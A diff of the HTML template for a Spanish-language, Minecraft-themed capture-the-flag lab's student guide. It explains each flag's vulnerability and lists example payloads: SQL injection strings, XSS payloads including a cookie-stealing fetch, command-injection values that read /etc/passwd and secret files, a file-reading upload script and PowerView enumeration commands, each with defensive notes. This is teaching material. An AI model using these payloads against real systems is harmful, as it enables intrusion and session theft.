@@ -6,33 +6,35 @@
 <div class="ctf-page-container ctf-wide-layout">
 
   <div class="ctf-page-header">
-    <div class="header-icon"><img src="{{ url_for('static', filename='img/Guia_recipe_book.png') }}" alt="" style="width:2.8rem;height:2.8rem;object-fit:contain;"></div>
+    <div class="header-icon"><img src="{{ url_for('static', filename='img/Guia_recipe_book.png') }}" alt=""
+        style="width:2.8rem;height:2.8rem;object-fit:contain;"></div>
     <h1 class="ctf-page-title">GUÍA DE APRENDIZAJE PARA ESTUDIANTES</h1>
     <p class="ctf-page-desc">
-      Aprender ciberseguridad debe ser claro, estructurado y sin frustración. Aquí tienes un ítem de la guía por cada bandera del laboratorio: el concepto, el porqué y una curiosidad del mundo real antes de atacar.
+      Aprender ciberseguridad debe ser claro, estructurado y sin frustración. Esta guía explica los conceptos de cada
+      bandera, herramientas útiles y curiosidades. No es una solución paso a paso: la idea es que investigues y
+      practiques.
     </p>
   </div>
 
   <div class="ctf-guide-grid ctf-guide-grid-wide">
 
-    <!-- ÍTEM 0: ¿QUÉ ES UNA BANDERA? -->
+    <!-- ÍTEM 0 -->
     <div class="ctf-guide-card">
       <div class="guide-card-header">
         <span class="guide-icon">🚩</span>
-        <h3>0. ¿Qué es una Bandera (Flag) y cómo se entrega?</h3>
+        <h3>0. ¿Qué es una Bandera (Flag)?</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          En un CTF tu meta es encontrar un secreto oculto. A ese secreto se le llama <strong>Bandera</strong> o <strong>Flag</strong>.
-        </p>
+        <p><strong>Concepto:</strong> En un CTF, la bandera es el secreto que demuestra que comprometiste el reto. Al
+          ingresarla correctamente ganas XP y sumas el ítem a tu inventario.</p>
         <div class="guide-example-box">
           <strong>Formato oficial:</strong> <code>Flag{MINECRAFT_...}</code> o en mayúsculas <code>FLAG{...}</code>
         </div>
-        <p>
-          Cuando la encuentres, cópiala exactamente e ingrésala en la caja de validación del desafío para ganar XP y sumar el ítem a tu inventario.
-        </p>
+        <p><strong>Tema:</strong> Concepto general de CTF (Capture The Flag).</p>
+        <p><strong>Herramientas:</strong> Navegador, terminal de Kali Linux, editor de texto.</p>
         <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> Las flags nacieron en los primeros CTF académicos (UCSB iCTF, 2003) para que los organizadores pudieran verificar automáticamente quién había comprometido un servicio.
+          <strong>Curiosidad:</strong> Las flags nacieron en los primeros CTF académicos (UCSB iCTF, 2003) para
+          verificar automáticamente quién había comprometido un servicio.
         </div>
       </div>
     </div>
@@ -40,18 +42,28 @@
     <!-- BANDERA 1: HIERRO -->
     <div class="ctf-guide-card">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/iron_ingot.png') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
-        <h3>1. Bandera — Lingote de Hierro: Esteganografía, Base64 y César (ROT-13)</h3>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/iron_ingot.png') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <h3>1. Bandera — Lingote de Hierro: Esteganografía, Base64 y César</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          El secreto no está en los píxeles: viaja dentro de los metadatos del PNG. Después se envuelve en Base64 y se cifra con un desplazamiento clásico.
-        </p>
-        <pre class="guide-code">exiftool mapa_cueva.png
+        <p><strong>Concepto:</strong> La flag está oculta en los metadatos de una imagen. Debes extraerla, decodificar
+          una capa de transporte y deshacer un cifrado clásico.</p>
+        <p><strong>Tema:</strong> Esteganografía en metadatos + codificación Base64 + cifrado César (ROT-13).</p>
+        <p><strong>Explicación:</strong> Los archivos PNG pueden contener campos de texto (metadatos) que no se ven en
+          la imagen. El secreto se envuelve en Base64 y se cifra con un desplazamiento de 13 posiciones.</p>
+        <p><strong>Herramientas y comandos de ejemplo:</strong></p>
+        <pre class="guide-code"># Inspeccionar metadatos de una imagen:
+exiftool imagen.png
+
+# Decodificar Base64:
 echo "TEXTO_BASE64" | base64 -d
+
+# Aplicar ROT-13:
 echo "TEXTO" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</pre>
         <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> El cifrado César debe su nombre a Julio César, que lo usaba para comunicarse con sus generales. ROT-13 es solo un caso particular con desplazamiento 13.
+          <strong>Curiosidad:</strong> El cifrado César debe su nombre a Julio César. ROT-13 es un caso particular con
+          desplazamiento 13. Los metadatos han filtrado información sensible en casos reales (autor, software, rutas).
         </div>
       </div>
     </div>
@@ -59,21 +71,35 @@ echo "TEXTO" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</pre>
     <!-- BANDERA 2: DIAMANTE -->
     <div class="ctf-guide-card">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/diamond.png') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
-        <h3>2. Bandera — Diamante: Inyección SQL clásica (' OR 1=1 --)</h3>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/diamond.png') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <h3>2. Bandera — Diamante: Inyección SQL (SQLi)</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          La aplicación concatena tu búsqueda dentro de la cláusula <code>WHERE</code> sin sanitizar. Con <code>' OR 1=1 --</code> fuerzas que la condición sea verdadera para todos los registros.
+        <p><strong>Concepto:</strong> El buscador de cofres concatena tu entrada directamente en la consulta SQL.
+          Aprovechando eso puedes ver registros que deberían estar bloqueados.</p>
+        <p><strong>Tema:</strong> SQL Injection (SQLi).</p>
+        <p><strong>Explicación:</strong> La comilla simple cierra el texto esperado, <code>OR 1=1</code> hace verdadera
+          la condición para todos los registros y <code>--</code> comenta el resto de la consulta, anulando filtros como
+          <code>AND bloqueado = 0</code>.
         </p>
-        <pre class="guide-code">SELECT * FROM cofres WHERE nombre LIKE '%TU_BUSQUEDA%' AND bloqueado = 0;</pre>
-        <div class="guide-steps-list">
-          <div><strong>1.</strong> La comilla <code>'</code> cierra el texto esperado y te deja agregar sentencias.</div>
-          <div><strong>2.</strong> <code>OR 1=1</code> hace verdadera la condición para todos los cofres.</div>
-          <div><strong>3.</strong> <code>--</code> comenta el resto y anula <code>AND bloqueado = 0</code>.</div>
-        </div>
+        <p><strong>Ejemplos de SQLi (para practicar):</strong></p>
+        <pre class="guide-code"># Bypass de login / filtro:
+' OR 1=1 --
+' OR '1'='1
+admin' --
+
+# Union-based (conceptual):
+' UNION SELECT NULL, NULL --
+
+# Time-based (conceptual):
+' OR SLEEP(5) --
+
+# Herramientas: sqlmap, Burp Suite, navegador.
+        </pre>
         <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> La primera SQLi documentada masivamente fue en 1998 por Jeff Forristal ("rain.forest.puppy"). Hoy sigue siendo el #1 del OWASP Top 10.
+          <strong>Curiosidad:</strong> La primera SQLi masiva se reportó en 1998. Hoy sigue siendo el riesgo #1 del
+          OWASP Top 10. La defensa es usar consultas parametrizadas.
         </div>
       </div>
     </div>
@@ -81,23 +107,32 @@ echo "TEXTO" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</pre>
     <!-- BANDERA 3: CONSOLA DE LAS CUEVAS -->
     <div class="ctf-guide-card">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/nether_portal.svg') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
-        <h3>3. Bandera — Consola de las Cuevas: enumeración y allowlist</h3>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/nether_portal.svg') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <h3>3. Bandera — Consola de las Cuevas: Enumeración y allowlist</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          La terminal de la cueva no es una shell real. Solo acepta una lista cerrada de comandos (<code>ls</code>, <code>cat</code>, <code>help</code> y <code>clear</code>) y resuelve las rutas contra un diccionario de cinco cuevas. Tu trabajo es enumerar y leer.
+        <p><strong>Concepto:</strong> Una terminal restringida permite enumerar rutas y leer archivos para encontrar la
+          llave de ignición del portal.</p>
+        <p><strong>Tema:</strong> Enumeración de rutas y validación por allowlist.</p>
+        <p><strong>Explicación:</strong> La consola solo acepta una lista cerrada de comandos (<code>ls</code>,
+          <code>cat</code>, <code>help</code>, <code>clear</code>) y resuelve rutas contra un diccionario. No es una
+          shell real.
         </p>
-        <pre class="guide-code">ls
-ls /cueva/lago-de-lava
-cat /cueva/lago-de-lava/llave_ignicion.txt</pre>
-        <div class="guide-steps-list">
-          <div><strong>1.</strong> <code>ls</code> muestra las cuevas y <code>ls &lt;cueva&gt;</code> sus archivos.</div>
-          <div><strong>2.</strong> <code>cat &lt;archivo&gt;</code> lee el contenido; no existe <code>cd</code>.</div>
-          <div><strong>3.</strong> No toda bandera que aparece es real: la tablilla congelada de la cueva de hielo es un señuelo.</div>
-        </div>
+        <p><strong>Herramientas y comandos de ejemplo:</strong></p>
+        <pre class="guide-code"># Enumerar:
+ls
+ls /cueva/<nombre>
+
+# Leer archivos:
+cat /cueva/<nombre>/<archivo>
+
+# Ayuda:
+help
+        </pre>
         <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> Una consola que valida por <em>allowlist</em> solo ejecuta lo que está en la lista. Las listas negras fallan porque siempre aparece un comando nuevo que nadie prohibió.
+          <strong>Curiosidad:</strong> Una consola que valida por <em>allowlist</em> solo ejecuta lo que está en la
+          lista. Las listas negras fallan porque siempre aparece un comando nuevo que nadie prohibió.
         </div>
       </div>
     </div>
@@ -105,38 +140,31 @@ cat /cueva/lago-de-lava/llave_ignicion.txt</pre>
     <!-- BANDERA 4: ORO / XSS -->
     <div class="ctf-guide-card">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/gold_ingot.png') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/gold_ingot.png') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
         <h3>4. Bandera — Lingote de Oro: Stored XSS y robo de cookies</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          <strong>¿Qué es XSS?</strong> Cross-Site Scripting (XSS) ocurre cuando una aplicación
-          guarda o muestra datos del usuario <strong>sin escaparlos</strong>. Si en lugar de texto
-          escribes HTML o JavaScript, el navegador de otra persona lo interpreta como código. En
-          este reto el dato se guarda en la nota de la oferta (<strong>XSS almacenado</strong>) y lo
-          abre el Piglin Guard con su sesión privilegiada.
-        </p>
-        <p>
-          El tablón que ves tú escapa la nota para no ejecutarla en tu navegador; el Guard la abre
-          sin escapar en el suyo. Por eso el payload se ejecuta en la sesión del Guard, no en la
-          tuya. No necesitas un script complejo: el bot acepta cualquier XSS básico.
-        </p>
-        <div class="guide-steps-list">
-          <div><strong>1.</strong> Escribe uno de los payloads de abajo en <strong>Mensaje para el Piglin</strong> y envía la oferta.</div>
-          <div><strong>2.</strong> Espera a que el Guard revise el tablón; el panel verde mostrará la cookie y la flag.</div>
-          <div><strong>3.</strong> Copia la flag y valídala manualmente en el formulario de la tarjeta.</div>
-        </div>
-        <p><strong>5 ejemplos básicos de XSS (cualquiera funciona):</strong></p>
+        <p><strong>Concepto:</strong> Inyectas código JavaScript en una nota pública. Otro usuario (el Piglin Guard) la
+          ejecuta en su navegador con sus permisos, permitiendo robar su sesión.</p>
+        <p><strong>Tema:</strong> Stored XSS y robo de cookies de sesión.</p>
+        <p><strong>Explicación:</strong> El tablón muestra la nota sin escaparla. El navegador del Guard interpreta el
+          script y puede enviar la cookie a un endpoint del servidor.</p>
+        <p><strong>Más ejemplos de script (XSS):</strong></p>
         <pre class="guide-code">&lt;script&gt;alert(1)&lt;/script&gt;
 &lt;script&gt;console.log('XSS')&lt;/script&gt;
 &lt;img src=x onerror=alert(1)&gt;
 &lt;svg onload=alert(1)&gt;
-&lt;a href="javascript:alert(1)"&gt;haz clic&lt;/a&gt;</pre>
+&lt;body onload=alert(1)&gt;
+&lt;a href="javascript:alert(1)"&gt;haz clic&lt;/a&gt;
+&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;
+
+# Robo de cookies (conceptual):
+&lt;script&gt;fetch('/endpoint?cookie=' + encodeURIComponent(document.cookie));&lt;/script&gt;
+        </pre>
         <div class="guide-highlight-box">
-          <strong>Tip:</strong> Usa <code>console.log('XSS')</code> si no quieres ventanas emergentes; el Guard lo detecta igual. Los ejemplos con <code>alert(1)</code> demuestran la ejecución, pero son más intrusivos si los pruebas fuera del laboratorio.
-        </div>
-        <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> El primer worm de XSS masivo fue "Samy" en MySpace (2005). En una sola hora infectó a más de un millón de perfiles.
+          <strong>Curiosidad:</strong> El worm "Samy" en MySpace (2005) infectó a más de un millón de perfiles en una
+          hora usando XSS almacenado. La defensa es escapar/validar la entrada y usar CSP.
         </div>
       </div>
     </div>
@@ -144,16 +172,33 @@ cat /cueva/lago-de-lava/llave_ignicion.txt</pre>
     <!-- BANDERA 5: BLAZE / FILE UPLOAD -->
     <div class="ctf-guide-card">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/blaze_rod.png') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/blaze_rod.png') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
         <h3>5. Bandera — Vara de Blaze: Subida de archivos a RCE</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          El caldero acepta cualquier archivo y lo ejecuta automáticamente al subirlo. Con un pequeño script Python puedes leer archivos del servidor y extraer el secreto.
-        </p>
-        <pre class="guide-code">print(open('/secret/blaze_rod.txt').read())</pre>
+        <p><strong>Concepto:</strong> Un formulario permite subir archivos y además ejecutarlos. Sin validación de
+          extensión ni contenido, puedes subir código malicioso.</p>
+        <p><strong>Tema:</strong> Unrestricted File Upload → ejecución remota de código (RCE).</p>
+        <p><strong>Explicación:</strong> El servidor guarda el archivo con el nombre y tipo que tú indicas y ofrece una
+          forma de ejecutarlo. Un script en Python puede leer archivos del servidor.</p>
+        <p><strong>Comandos para crear la carpeta/archivo desde la terminal:</strong></p>
+        <pre class="guide-code"># Crear una carpeta de trabajo:
+mkdir -p ~/ctf/blaze && cd ~/ctf/blaze
+
+# Crear el script con un editor:
+nano receta.py
+# o con echo:
+echo "print(open('/ruta/del/archivo').read())" > receta.py
+
+# Ver el contenido:
+cat receta.py
+ls -la
+        </pre>
         <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> La falta de validación de extensiones es la causa de muchos incidentes reales: un formulario de "subir avatar" que termina ejecutando un webshell.
+          <strong>Curiosidad:</strong> La falta de validación de extensiones es la causa de muchos incidentes reales: un
+          formulario de "subir avatar" que termina ejecutando un webshell. La defensa es validar extensión, MIME y
+          contenido.
         </div>
       </div>
     </div>
@@ -161,16 +206,41 @@ cat /cueva/lago-de-lava/llave_ignicion.txt</pre>
     <!-- BANDERA 6: PEARL / PRIVILEGE ESCALATION -->
     <div class="ctf-guide-card">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/ender_pearl.png') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
-        <h3>6. Bandera — Ojo de Ender: Violación de mínimo privilegio y parameter tampering</h3>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/ender_pearl.png') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <h3>6. Bandera — Ojo de Ender: Violación de mínimo privilegio</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          El altar decide tu rol a partir de un dato que tú mismo envías (<code>user_role</code>). Si lo cambias a <code>ender_master</code>, el servidor te concede acceso sin validar la identidad real.
-        </p>
-        <pre class="guide-code">/nether/pearl/altar?user_role=ender_master</pre>
+        <p><strong>Concepto:</strong> El servidor decide tu rol a partir de un dato que tú mismo envías (parámetro o
+          cookie). Si lo modificas, puedes obtener privilegios que no te corresponden.</p>
+        <p><strong>Tema:</strong> Broken Access Control / parameter tampering.</p>
+        <p><strong>Explicación:</strong> Esto se conoce como "decide by client": el cliente puede mentir sobre su
+          identidad o rol. En la práctica, cambiar un parámetro en la URL o en una cookie ha dado acceso de
+          administrador.</p>
+        <p><strong>Flujo de carpetas en la terminal:</strong></p>
+        <pre class="guide-code"># Ver dónde estás:
+pwd
+
+# Listar contenido:
+ls -la
+
+# Entrar a una carpeta:
+cd nombre_carpeta
+
+# Subir un nivel:
+cd ..
+
+# Buscar archivos:
+find . -name "*.txt"
+
+# Leer un archivo:
+cat archivo.txt
+
+# (La idea es inspeccionar el sistema de archivos y entender cómo se organizan los recursos.)
+        </pre>
         <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> A este fallo se le llama "decide by client". En la práctica, cambiar un parámetro en la URL o en una cookie ha dado acceso de administrador en sistemas reales.
+          <strong>Curiosidad:</strong> Cambiar un parámetro en la URL o en una cookie ha dado acceso de administrador en
+          sistemas reales (IDOR / broken access control). La defensa es validar permisos en el servidor.
         </div>
       </div>
     </div>
@@ -178,16 +248,34 @@ cat /cueva/lago-de-lava/llave_ignicion.txt</pre>
     <!-- BANDERA 7: CRYSTALS / CVE -->
     <div class="ctf-guide-card">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/end_crystal.png') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
-        <h3>7. Bandera — Cristales del End: Explotación de servicio y CVE simulado</h3>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/end_crystal.png') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <h3>7. Bandera — Cristales del End: Explotación de servicio y backdoor</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          El servicio de telemetría tiene una puerta atrás: compara tu entrada contra un token fijo y, si coincide, ejecuta comandos. Enviar el payload correcto detona los cristales.
-        </p>
-        <pre class="guide-code">CVE-2026-OVERLOAD;shatter_crystals</pre>
+        <p><strong>Concepto:</strong> Un servicio interno tiene una puerta atrás (backdoor) que compara tu entrada
+          contra un token fijo y, si coincide, ejecuta comandos.</p>
+        <p><strong>Tema:</strong> Explotación de servicio / backdoor (CVE simulado).</p>
+        <p><strong>Explicación:</strong> Estas backdoors casi nunca se aleatorizan: comparan tu entrada contra un token
+          fijo. El proveedor y el año suelen estar escritos en el propio token.</p>
+        <p><strong>Más ejemplos de exploit (incluye el necesario):</strong></p>
+        <pre class="guide-code"># Payloads de ejemplo para servicios con backdoor:
+CVE-2026-OVERLOAD;shatter_crystals
+AB;shatter_crystals
+OVERLOAD_CRYSTALS
+
+# Concatenación de comandos (conceptual):
+valor; ls
+valor && whoami
+valor | cat /etc/passwd
+
+# Otros triggers comunes:
+shatter_crystals
+CVE-2026-OVERLOAD
+        </pre>
         <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> Backdoors reales se han escondido en software legítimo (por ejemplo, en servidores IRC o compiladores) y se activaban con una secuencia exacta de bytes.
+          <strong>Curiosidad:</strong> Backdoors reales se han escondido en software legítimo (servidores IRC,
+          compiladores) y se activaban con una secuencia exacta de bytes.
         </div>
       </div>
     </div>
@@ -195,51 +283,89 @@ cat /cueva/lago-de-lava/llave_ignicion.txt</pre>
     <!-- BANDERA 8: DRAGON / COMMAND INJECTION -->
     <div class="ctf-guide-card">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/ender_dragon.png') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/ender_dragon.png') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
         <h3>8. Bandera — Ender Dragón: Inyección de comandos (Command Injection)</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          Tu potencia se inserta dentro de una línea que se ejecuta en una shell. Si terminas el comando antes (con <code>;</code> o <code>&&</code>), la shell interpreta el resto como una orden nueva.
+        <p><strong>Concepto:</strong> Tu entrada se inserta dentro de una línea que se ejecuta en una shell. Si terminas
+          el comando antes, la shell interpreta el resto como una orden nueva.</p>
+        <p><strong>Tema:</strong> Command Injection.</p>
+        <p><strong>Explicación:</strong> La shell no sabe dónde acaba tu dato. Usando metacaracteres como
+          <code>;</code>, <code>&amp;&amp;</code> o <code>|</code> puedes ejecutar comandos adicionales.
         </p>
-        <pre class="guide-code">100; cat /secret/dragon_slain.txt</pre>
+        <p><strong>Comando inicial (ejemplo):</strong></p>
+        <pre class="guide-code"># Comando inicial para empezar la inyección:
+100; cat /secret/dragon_slain.txt
+
+# Variantes:
+100 && cat /secret/dragon_slain.txt
+100 | cat /secret/dragon_slain.txt
+        </pre>
         <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> Shellshock (CVE-2014-6271) permitía ejecutar comandos arbitrarios a través de variables de entorno, afectando a millones de servidores Linux y dispositivos IoT.
+          <strong>Curiosidad:</strong> Shellshock (CVE-2014-6271) permitió ejecutar comandos arbitrarios en millones de
+          servidores Linux y dispositivos IoT. La defensa es evitar <code>shell=True</code> y validar/sanitizar la
+          entrada.
         </div>
       </div>
     </div>
 
-    <!-- BANDERA 9: EGG / POWERVIEW + ACTIVE DIRECTORY -->
+    <!-- BANDERA 9: HUEVO / POWERVIEW (ACTIVE DIRECTORY) -->
     <div class="ctf-guide-card guide-highlight">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/dragon_egg.png') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/dragon_egg.png') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
         <h3>9. Bandera — Huevo de Dragón: Enumeración de Active Directory con PowerView</h3>
       </div>
       <div class="guide-card-body">
-        <p>
-          El Huevo ya no está en un archivo público: está archivado en el dominio <code>end.local</code>. PowerView permite enumerar usuarios, grupos, equipos y recursos compartidos. La descripción de una cuenta de servicio revela el servidor y el share donde se guarda el Huevo.
-        </p>
-        <pre class="guide-code">Get-NetUser
+        <p><strong>Concepto:</strong> El Huevo está archivado en un dominio de Active Directory simulado (end.local).
+          Debes enumerar usuarios, grupos, equipos y recursos compartidos para localizar el archivo del Huevo en el
+          servidor de archivos.</p>
+        <p><strong>Tema:</strong> Enumeración de Active Directory con PowerView.</p>
+        <p><strong>Explicación:</strong> PowerView es una herramienta de auditoría de AD que permite listar objetos del
+          dominio (usuarios, grupos, equipos, shares, sesiones). Las descripciones de cuentas de servicio suelen revelar
+          recursos internos, y los shares pueden exponer archivos sensibles.</p>
+        <p><strong>Comandos disponibles (consola PowerView):</strong></p>
+        <pre class="guide-code">Get-NetDomain
+Get-NetDomainController
+Get-NetUser
+Get-NetUser -UserName <usuario>
+Get-NetGroup
+Get-NetGroupMember -GroupName "<grupo>"
+Get-NetComputer
+Get-NetShare -ComputerName <equipo>
 Find-DomainShare
-Get-Content \\END-FS01\vault\real_dragon_egg.txt</pre>
+Invoke-UserHunter
+Get-Content \\\\SERVIDOR\\recurso\\archivo.txt
+help
+clear
+        </pre>
         <div class="guide-highlight-box">
-          <strong>Curiosidad:</strong> PowerView (PowerSploit) es una herramienta de referencia en auditorías de Active Directory. En defensa, revisa las descripciones de cuentas de servicio, aplica mínimo privilegio a los shares y monitoriza las consultas LDAP y SMB.
+          <strong>Curiosidad:</strong> PowerView forma parte de PowerSploit y se usa en auditorías de Active Directory
+          para enumerar usuarios, grupos, equipos, sesiones y shares. La defensa combina mínimo privilegio en los
+          recursos compartidos, cuentas de servicio administradas (gMSA) y monitorización de consultas LDAP y SMB.
         </div>
       </div>
     </div>
+
 
     <!-- MÉTODO DE APRENDIZAJE -->
     <div class="ctf-guide-card guide-highlight">
       <div class="guide-card-header">
-        <span class="guide-icon"><img src="{{ url_for('static', filename='img/diamond_pickaxe.png') }}" alt="" style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
+        <span class="guide-icon"><img src="{{ url_for('static', filename='img/diamond_pickaxe.png') }}" alt=""
+            style="width:1.5rem;height:1.5rem;object-fit:contain;"></span>
         <h3>10. Método de Aprendizaje Recomendado</h3>
       </div>
       <div class="guide-card-body">
         <ol class="guide-ordered-list">
           <li><strong>Comienza por el Overworld:</strong> es la dimensión introductoria.</li>
-          <li><strong>Usa el botón "Ver Código":</strong> inspecciona el código vulnerable para entender dónde está el error.</li>
+          <li><strong>Usa el botón "Ver Código":</strong> inspecciona el código vulnerable para entender dónde está el
+            error.</li>
           <li><strong>Consulta las Pistas:</strong> desbloquea pistas conceptuales usando la XP que acumulas.</li>
-          <li><strong>Lee la Guía por bandera:</strong> cada ítem te da la curiosidad y el concepto antes de atacar.</li>
+          <li><strong>Lee la Guía por bandera:</strong> cada ítem te da el concepto y la curiosidad antes de atacar.
+          </li>
+          <li><strong>Practica con las herramientas:</strong> usa los comandos de ejemplo como referencia, no como
+            solución directa.</li>
         </ol>
       </div>
     </div>
